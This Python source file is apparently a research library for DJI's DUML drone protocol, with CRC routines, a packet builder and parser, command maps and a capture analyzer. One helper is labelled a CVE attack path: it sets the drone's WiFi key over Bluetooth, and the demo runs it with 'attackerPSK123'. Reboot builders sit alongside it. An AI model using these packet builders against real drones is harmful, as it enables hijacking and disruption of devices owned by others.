"""
DJI DUML (Universal Markup Language) Protocol Library

Implements the DUML command protocol used internally by DJI drones.
DUML commands are carried over Bluetooth, WiFi, USB, and OcuSync.

Supports:
- Packet construction and parsing
- CRC-8 and CRC-16 (Kermit) calculation
- Command set definitions for WiFi, Bluetooth, and flight control
- Known command mapping from published research

Usage:
    from duml_protocol import DUMLPacket, build_wifi_psk_set, build_reboot

For authorized security research only.
"""

import struct
import sys


# DUML packet delimiters
DUML_START = 0x55

# CRC-8 lookup table (DJI variant)
CRC8_TABLE = [
    0x00, 0x5e, 0xbc, 0xe2, 0x61, 0x3f, 0xdd, 0x83,
    0xc2, 0x9c, 0x7e, 0x20, 0xa3, 0xfd, 0x1f, 0x41,
    0x9d, 0xc3, 0x21, 0x7f, 0xfc, 0xa2, 0x40, 0x1e,
    0x5f, 0x01, 0xe3, 0xbd, 0x3e, 0x60, 0x82, 0xdc,
    0x23, 0x7d, 0x9f, 0xc1, 0x42, 0x1c, 0xfe, 0xa0,
    0xe1, 0xbf, 0x5d, 0x03, 0x80, 0xde, 0x3c, 0x62,
    0xbe, 0xe0, 0x02, 0x5c, 0xdf, 0x81, 0x63, 0x3d,
    0x7c, 0x22, 0xc0, 0x9e, 0x1d, 0x43, 0xa1, 0xff,
    0x46, 0x18, 0xfa, 0xa4, 0x27, 0x79, 0x9b, 0xc5,
    0x84, 0xda, 0x38, 0x66, 0xe5, 0xbb, 0x59, 0x07,
    0xdb, 0x85, 0x67, 0x39, 0xba, 0xe4, 0x06, 0x58,
    0x19, 0x47, 0xa5, 0xfb, 0x78, 0x26, 0xc4, 0x9a,
    0x65, 0x3b, 0xd9, 0x87, 0x04, 0x5a, 0xb8, 0xe6,
    0xa7, 0xf9, 0x1b, 0x45, 0xc6, 0x98, 0x7a, 0x24,
    0xf8, 0xa6, 0x44, 0x1a, 0x99, 0xc7, 0x25, 0x7b,
    0x3a, 0x64, 0x86, 0xd8, 0x5b, 0x05, 0xe7, 0xb9,
    0x8c, 0xd2, 0x30, 0x6e, 0xed, 0xb3, 0x51, 0x0f,
    0x4e, 0x10, 0xf2, 0xac, 0x2f, 0x71, 0x93, 0xcd,
    0x11, 0x4f, 0xad, 0xf3, 0x70, 0x2e, 0xcc, 0x92,
    0xd3, 0x8d, 0x6f, 0x31, 0xb2, 0xec, 0x0e, 0x50,
    0xaf, 0xf1, 0x13, 0x4d, 0xce, 0x90, 0x72, 0x2c,
    0x6d, 0x33, 0xd1, 0x8f, 0x0c, 0x52, 0xb0, 0xee,
    0x32, 0x6c, 0x8e, 0xd0, 0x53, 0x0d, 0xef, 0xb1,
    0xf0, 0xae, 0x4c, 0x12, 0x91, 0xcf, 0x2d, 0x73,
    0xca, 0x94, 0x76, 0x28, 0xab, 0xf5, 0x17, 0x49,
    0x08, 0x56, 0xb4, 0xea, 0x69, 0x37, 0xd5, 0x8b,
    0x57, 0x09, 0xeb, 0xb5, 0x36, 0x68, 0x8a, 0xd4,
    0x95, 0xcb, 0x29, 0x77, 0xf4, 0xaa, 0x48, 0x16,
    0xe9, 0xb7, 0x55, 0x0b, 0x88, 0xd6, 0x34, 0x6a,
    0x2b, 0x75, 0x97, 0xc9, 0x4a, 0x14, 0xf6, 0xa8,
    0x74, 0x2a, 0xc8, 0x96, 0x15, 0x4b, 0xa9, 0xf7,
    0xb6, 0xe8, 0x0a, 0x54, 0xd7, 0x89, 0x6b, 0x35,
]

# CRC-16 Kermit lookup table
CRC16_TABLE = [
    0x0000, 0x1189, 0x2312, 0x329b, 0x4624, 0x57ad, 0x6536, 0x74bf,
    0x8c48, 0x9dc1, 0xaf5a, 0xbed3, 0xca6c, 0xdbe5, 0xe97e, 0xf8f7,
    0x1081, 0x0108, 0x3393, 0x221a, 0x56a5, 0x472c, 0x75b7, 0x643e,
    0x9cc9, 0x8d40, 0xbfdb, 0xae52, 0xdaed, 0xcb64, 0xf9ff, 0xe876,
    0x2102, 0x308b, 0x0210, 0x1399, 0x6726, 0x76af, 0x4434, 0x55bd,
    0xad4a, 0xbcc3, 0x8e58, 0x9fd1, 0xeb6e, 0xfae7, 0xc87c, 0xd9f5,
    0x3183, 0x200a, 0x1291, 0x0318, 0x77a7, 0x662e, 0x54b5, 0x453c,
    0xbdcb, 0xac42, 0x9ed9, 0x8f50, 0xfbef, 0xea66, 0xd8fd, 0xc974,
    0x4204, 0x538d, 0x6116, 0x709f, 0x0420, 0x15a9, 0x2732, 0x36bb,
    0xce4c, 0xdfc5, 0xed5e, 0xfcd7, 0x8868, 0x99e1, 0xab7a, 0xbaf3,
    0x5285, 0x430c, 0x7197, 0x601e, 0x14a1, 0x0528, 0x37b3, 0x263a,
    0xdecd, 0xcf44, 0xfddf, 0xec56, 0x98e9, 0x8960, 0xbbfb, 0xaa72,
    0x6306, 0x728f, 0x4014, 0x519d, 0x2522, 0x34ab, 0x0630, 0x17b9,
    0xef4e, 0xfec7, 0xcc5c, 0xddd5, 0xa96a, 0xb8e3, 0x8a78, 0x9bf1,
    0x7387, 0x620e, 0x5095, 0x411c, 0x35a3, 0x242a, 0x16b1, 0x0738,
    0xffcf, 0xee46, 0xdcdd, 0xcd54, 0xb9eb, 0xa862, 0x9af9, 0x8b70,
    0x8408, 0x9581, 0xa71a, 0xb693, 0xc22c, 0xd3a5, 0xe13e, 0xf0b7,
    0x0840, 0x19c9, 0x2b52, 0x3adb, 0x4e64, 0x5fed, 0x6d76, 0x7cff,
    0x9489, 0x8500, 0xb79b, 0xa612, 0xd2ad, 0xc324, 0xf1bf, 0xe036,
    0x18c1, 0x0948, 0x3bd3, 0x2a5a, 0x5ee5, 0x4f6c, 0x7df7, 0x6c7e,
    0xa50a, 0xb483, 0x8618, 0x9791, 0xe32e, 0xf2a7, 0xc03c, 0xd1b5,
    0x2942, 0x38cb, 0x0a50, 0x1bd9, 0x6f66, 0x7eef, 0x4c74, 0x5dfd,
    0xb58b, 0xa402, 0x9699, 0x8710, 0xf3af, 0xe226, 0xd0bd, 0xc134,
    0x39c3, 0x284a, 0x1ad1, 0x0b58, 0x7fe7, 0x6e6e, 0x5cf5, 0x4d7c,
    0xc60c, 0xd785, 0xe51e, 0xf497, 0x8028, 0x91a1, 0xa33a, 0xb2b3,
    0x4a44, 0x5bcd, 0x6956, 0x78df, 0x0c60, 0x1de9, 0x2f72, 0x3efb,
    0xd68d, 0xc704, 0xf59f, 0xe416, 0x90a9, 0x8120, 0xb3bb, 0xa232,
    0x5ac5, 0x4b4c, 0x79d7, 0x685e, 0x1ce1, 0x0d68, 0x3ff3, 0x2e7a,
    0xe70e, 0xf687, 0xc41c, 0xd595, 0xa12a, 0xb0a3, 0x8238, 0x93b1,
    0x6b46, 0x7acf, 0x4854, 0x59dd, 0x2d62, 0x3ceb, 0x0e70, 0x1ff9,
    0xf78f, 0xe606, 0xd49d, 0xc514, 0xb1ab, 0xa022, 0x92b9, 0x8330,
    0x7bc7, 0x6a4e, 0x58d5, 0x495c, 0x3de3, 0x2c6a, 0x1ef1, 0x0f78,
]


# DUML device/component IDs (from OG firmware tools)
DEVICE_IDS = {
    0x00: 'Camera',
    0x01: 'App / Mobile Device',
    0x02: 'Flight Controller',
    0x03: 'Gimbal',
    0x04: 'Center Board',
    0x05: 'Remote Controller',
    0x06: 'WiFi Module',
    0x07: 'DM368 / LB2 Chip',
    0x08: 'OSD Module',
    0x09: 'Battery',
    0x0A: 'ESC',
    0x0B: 'DM365 / LB DM8107',
    0x0C: 'Eye Module',
    0x0D: 'DM368 Ground',
    0x0E: 'PC/Viewer',
    0x1E: 'Bluetooth',
}

# DUML command types
CMD_TYPE_REQUEST = 0x00
CMD_TYPE_RESPONSE = 0x01
CMD_TYPE_PUSH = 0x02

# Known command sets and commands
CMD_SET_GENERAL = 0x00
CMD_SET_SPECIAL = 0x01
CMD_SET_CAMERA = 0x02
CMD_SET_FLIGHT = 0x03
CMD_SET_GIMBAL = 0x04
CMD_SET_CENTER = 0x05
CMD_SET_RC = 0x06
CMD_SET_WIFI = 0x07
CMD_SET_DM368 = 0x08
CMD_SET_OSD = 0x09
CMD_SET_BATTERY = 0x0D
CMD_SET_ESC = 0x0E

# Known WiFi commands (cmd_set=0x07)
WIFI_CMDS = {
    0x01: 'Get WiFi Info',
    0x02: 'Set WiFi SSID',
    0x03: 'Set WiFi PSK',
    0x04: 'Set WiFi Channel',
    0x05: 'Set WiFi Mode',
    0x06: 'WiFi Reboot',
    0x07: 'Set WiFi Country',
    0x08: 'Set WiFi MAC',
    0x09: 'Disable WiFi',
    0x0A: 'Enable WiFi',
    0x0B: 'Get WiFi Status',
    0x0C: 'Disconnect Clients',
    0x0D: 'Reset WiFi Config',
}

# Known general commands (cmd_set=0x00)
GENERAL_CMDS = {
    0x01: 'Heartbeat',
    0x02: 'Get Device Info',
    0x03: 'Get Serial Number',
    0x04: 'Reboot',
    0x05: 'Get Firmware Version',
    0x06: 'Set Date/Time',
    0x07: 'Get Date/Time',
    0x0B: 'Enter Firmware Upgrade',
    0x24: 'Get Hardware ID',
    0x30: 'Set Activation',
}

# Known flight control commands (cmd_set=0x03)
FLIGHT_CMDS = {
    0x01: 'Get Flight Status',
    0x02: 'Set Home Point',
    0x03: 'Set Flight Limit',
    0x05: 'Set RTH Altitude',
    0x06: 'Start Motors',
    0x07: 'Stop Motors',
    0x09: 'Takeoff',
    0x0A: 'Land',
    0x0B: 'Go Home',
    0x10: 'Joystick Control',
    0x20: 'Set Flight Mode',
}

# Command set name lookup
CMD_SET_NAMES = {
    CMD_SET_GENERAL: 'General',
    CMD_SET_SPECIAL: 'Special',
    CMD_SET_CAMERA: 'Camera',
    CMD_SET_FLIGHT: 'Flight Control',
    CMD_SET_GIMBAL: 'Gimbal',
    CMD_SET_CENTER: 'Center Board',
    CMD_SET_RC: 'Remote Controller',
    CMD_SET_WIFI: 'WiFi',
    CMD_SET_DM368: 'DM368',
    CMD_SET_OSD: 'OSD',
    CMD_SET_BATTERY: 'Battery',
    CMD_SET_ESC: 'ESC',
}

CMD_LOOKUP = {
    CMD_SET_GENERAL: GENERAL_CMDS,
    CMD_SET_WIFI: WIFI_CMDS,
    CMD_SET_FLIGHT: FLIGHT_CMDS,
}


def crc8(data):
    """Calculate DJI CRC-8."""
    crc = 0x77  # DJI seed
    for byte in data:
        crc = CRC8_TABLE[(crc ^ byte) & 0xFF]
    return crc


def crc16_kermit(data):
    """Calculate CRC-16 Kermit (used by DUML)."""
    crc = 0x3692  # DJI seed
    for byte in data:
        crc = (crc >> 8) ^ CRC16_TABLE[(crc ^ byte) & 0xFF]
    return crc


class DUMLPacket:
    """Represents a DUML protocol packet."""

    def __init__(self):
        self.start = DUML_START
        self.length = 0
        self.version = 0x04
        self.crc8 = 0
        self.sender = 0x01  # App
        self.receiver = 0x02  # Flight Controller
        self.seq_num = 0
        self.cmd_type = CMD_TYPE_REQUEST
        self.ack_needed = True
        self.cmd_set = 0
        self.cmd_id = 0
        self.payload = b''
        self.crc16 = 0

    @classmethod
    def parse(cls, data):
        """Parse a DUML packet from bytes."""
        if len(data) < 11:
            return None
        if data[0] != DUML_START:
            return None

        pkt = cls()
        pkt.start = data[0]

        # Length is 10 bits in bytes 1-2
        pkt.length = struct.unpack('<H', data[1:3])[0] & 0x03FF
        pkt.version = (data[2] >> 2) & 0x3F

        if len(data) < pkt.length:
            return None

        pkt.crc8 = data[3]

        # Verify CRC-8
        calc_crc8 = crc8(data[:3])
        if calc_crc8 != pkt.crc8:
            pkt._crc8_valid = False
        else:
            pkt._crc8_valid = True

        pkt.sender = data[4] & 0x1F
        pkt.sender_idx = (data[4] >> 5) & 0x07
        pkt.receiver = data[5] & 0x1F
        pkt.receiver_idx = (data[5] >> 5) & 0x07

        pkt.seq_num = struct.unpack('<H', data[6:8])[0]

        pkt.cmd_type = data[8] & 0x7F
        pkt.ack_needed = bool(data[8] & 0x80)

        pkt.cmd_set = data[9]
        pkt.cmd_id = data[10]

        # Payload is between header and CRC-16
        if pkt.length > 13:
            pkt.payload = data[11:pkt.length - 2]
        else:
            pkt.payload = b''

        # CRC-16
        pkt.crc16 = struct.unpack('<H', data[pkt.length - 2:pkt.length])[0]
        calc_crc16 = crc16_kermit(data[:pkt.length - 2])
        pkt._crc16_valid = (calc_crc16 == pkt.crc16)

        return pkt

    def build(self):
        """Build the packet bytes."""
        # Header: start(1) + length(2) + crc8(1) + sender(1) + receiver(1) +
        #         seq(2) + cmd_type(1) + cmd_set(1) + cmd_id(1) = 11 bytes
        # + payload + crc16(2)
        self.length = 11 + len(self.payload) + 2

        header = bytearray(3)
        header[0] = self.start
        length_version = (self.length & 0x03FF) | ((self.version & 0x3F) << 10)
        struct.pack_into('<H', header, 1, length_version)

        self.crc8 = crc8(header)

        pkt = bytearray()
        pkt.extend(header)
        pkt.append(self.crc8)

        pkt.append((self.sender & 0x1F) | ((getattr(self, 'sender_idx', 0) & 0x07) << 5))
        pkt.append((self.receiver & 0x1F) | ((getattr(self, 'receiver_idx', 0) & 0x07) << 5))

        pkt.extend(struct.pack('<H', self.seq_num))

        cmd_byte = (self.cmd_type & 0x7F) | (0x80 if self.ack_needed else 0x00)
        pkt.append(cmd_byte)

        pkt.append(self.cmd_set)
        pkt.append(self.cmd_id)

        pkt.extend(self.payload)

        self.crc16 = crc16_kermit(pkt)
        pkt.extend(struct.pack('<H', self.crc16))

        return bytes(pkt)

    def describe(self):
        """Return a human-readable description."""
        sender_name = DEVICE_IDS.get(self.sender, f'0x{self.sender:02x}')
        receiver_name = DEVICE_IDS.get(self.receiver, f'0x{self.receiver:02x}')
        set_name = CMD_SET_NAMES.get(self.cmd_set, f'0x{self.cmd_set:02x}')

        cmd_name = 'Unknown'
        if self.cmd_set in CMD_LOOKUP:
            cmd_name = CMD_LOOKUP[self.cmd_set].get(self.cmd_id, f'0x{self.cmd_id:02x}')

        cmd_type_str = {0: 'REQ', 1: 'RESP', 2: 'PUSH'}.get(self.cmd_type, f'{self.cmd_type}')

        lines = [
            f"DUML Packet (length={self.length}, seq={self.seq_num})",
            f"  {sender_name} → {receiver_name}  [{cmd_type_str}]"
            f"{'  ACK' if self.ack_needed else ''}",
            f"  Command: {set_name} / {cmd_name} (set=0x{self.cmd_set:02x} id=0x{self.cmd_id:02x})",
        ]
        if self.payload:
            lines.append(f"  Payload ({len(self.payload)} bytes): {self.payload.hex()}")
        if hasattr(self, '_crc8_valid'):
            lines.append(f"  CRC8: {'OK' if self._crc8_valid else 'FAIL'}  "
                         f"CRC16: {'OK' if self._crc16_valid else 'FAIL'}")
        return '\n'.join(lines)

    def __repr__(self):
        return self.describe()


# --- Convenience builders for known commands ---

def build_wifi_psk_set(psk, seq=0):
    """Build a DUML command to set the WiFi PSK (CVE-2026-78306 attack path)."""
    pkt = DUMLPacket()
    pkt.sender = 0x1E  # Bluetooth
    pkt.receiver = 0x06  # WiFi Module
    pkt.seq_num = seq
    pkt.cmd_set = CMD_SET_WIFI
    pkt.cmd_id = 0x03  # Set WiFi PSK
    pkt.payload = psk.encode('utf-8') + b'\x00'
    return pkt.build()


def build_wifi_ssid_set(ssid, seq=0):
    """Build a DUML command to set the WiFi SSID."""
    pkt = DUMLPacket()
    pkt.sender = 0x1E  # Bluetooth
    pkt.receiver = 0x06  # WiFi Module
    pkt.seq_num = seq
    pkt.cmd_set = CMD_SET_WIFI
    pkt.cmd_id = 0x02  # Set WiFi SSID
    pkt.payload = ssid.encode('utf-8') + b'\x00'
    return pkt.build()


def build_wifi_reboot(seq=0):
    """Build a DUML command to reboot the WiFi module."""
    pkt = DUMLPacket()
    pkt.sender = 0x1E
    pkt.receiver = 0x06
    pkt.seq_num = seq
    pkt.cmd_set = CMD_SET_WIFI
    pkt.cmd_id = 0x06  # WiFi Reboot
    pkt.payload = b''
    return pkt.build()


def build_reboot(seq=0):
    """Build a general device reboot command."""
    pkt = DUMLPacket()
    pkt.sender = 0x01  # App
    pkt.receiver = 0x02  # FC
    pkt.seq_num = seq
    pkt.cmd_set = CMD_SET_GENERAL
    pkt.cmd_id = 0x04  # Reboot
    pkt.payload = b''
    return pkt.build()


def build_get_device_info(seq=0):
    """Build a get device info command."""
    pkt = DUMLPacket()
    pkt.sender = 0x01
    pkt.receiver = 0x02
    pkt.seq_num = seq
    pkt.cmd_set = CMD_SET_GENERAL
    pkt.cmd_id = 0x02  # Get Device Info
    pkt.payload = b''
    return pkt.build()


def build_get_serial(seq=0):
    """Build a get serial number command."""
    pkt = DUMLPacket()
    pkt.sender = 0x01
    pkt.receiver = 0x02
    pkt.seq_num = seq
    pkt.cmd_set = CMD_SET_GENERAL
    pkt.cmd_id = 0x03  # Get Serial
    pkt.payload = b''
    return pkt.build()


def find_duml_packets(data):
    """Find and parse all DUML packets in a byte stream."""
    packets = []
    pos = 0
    while pos < len(data):
        idx = data.find(bytes([DUML_START]), pos)
        if idx == -1:
            break
        pkt = DUMLPacket.parse(data[idx:])
        if pkt and pkt._crc8_valid:
            packets.append((idx, pkt))
            pos = idx + pkt.length
        else:
            pos = idx + 1
    return packets


def analyze_capture(data):
    """Analyze a captured byte stream for DUML packets."""
    packets = find_duml_packets(data)

    print(f"\n{'=' * 70}")
    print(f"DUML PROTOCOL ANALYSIS — {len(packets)} packets found in {len(data)} bytes")
    print(f"{'=' * 70}")

    cmd_stats = {}
    device_pairs = set()

    for offset, pkt in packets:
        print(f"\n[0x{offset:08x}] {pkt.describe()}")

        key = (pkt.cmd_set, pkt.cmd_id)
        cmd_stats[key] = cmd_stats.get(key, 0) + 1
        device_pairs.add((pkt.sender, pkt.receiver))

    print(f"\n{'=' * 70}")
    print("SUMMARY")
    print(f"{'=' * 70}")
    print(f"Total packets: {len(packets)}")
    print(f"\nCommand frequency:")
    for (cmd_set, cmd_id), count in sorted(cmd_stats.items(), key=lambda x: -x[1]):
        set_name = CMD_SET_NAMES.get(cmd_set, f'0x{cmd_set:02x}')
        cmd_name = 'Unknown'
        if cmd_set in CMD_LOOKUP:
            cmd_name = CMD_LOOKUP[cmd_set].get(cmd_id, f'0x{cmd_id:02x}')
        print(f"  {set_name}/{cmd_name}: {count}")

    print(f"\nDevice communication pairs:")
    for sender, receiver in sorted(device_pairs):
        s_name = DEVICE_IDS.get(sender, f'0x{sender:02x}')
        r_name = DEVICE_IDS.get(receiver, f'0x{receiver:02x}')
        print(f"  {s_name} → {r_name}")


def demo():
    """Demonstrate DUML packet building and parsing."""
    print("DUML Protocol Library — Demo")
    print("=" * 50)

    # Build a WiFi PSK set command
    psk_pkt_bytes = build_wifi_psk_set("attackerPSK123", seq=1)
    print(f"\nWiFi PSK Set command ({len(psk_pkt_bytes)} bytes):")
    print(f"  Hex: {psk_pkt_bytes.hex()}")

    # Parse it back
    parsed = DUMLPacket.parse(psk_pkt_bytes)
    if parsed:
        print(f"\n{parsed.describe()}")

    # Build other commands
    for name, builder in [
        ("Get Device Info", build_get_device_info),
        ("Get Serial Number", build_get_serial),
        ("Reboot", build_reboot),
        ("WiFi Reboot", build_wifi_reboot),
    ]:
        pkt_bytes = builder(seq=0)
        print(f"\n{name} ({len(pkt_bytes)} bytes): {pkt_bytes.hex()}")
        parsed = DUMLPacket.parse(pkt_bytes)
        if parsed:
            print(f"  {parsed.describe()}")


if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == '--analyze':
        if len(sys.argv) < 3:
            print("Usage: python3 duml_protocol.py --analyze <capture_file>")
            sys.exit(1)
        with open(sys.argv[2], 'rb') as f:
            data = f.read()
        analyze_capture(data)
    else:
        demo()
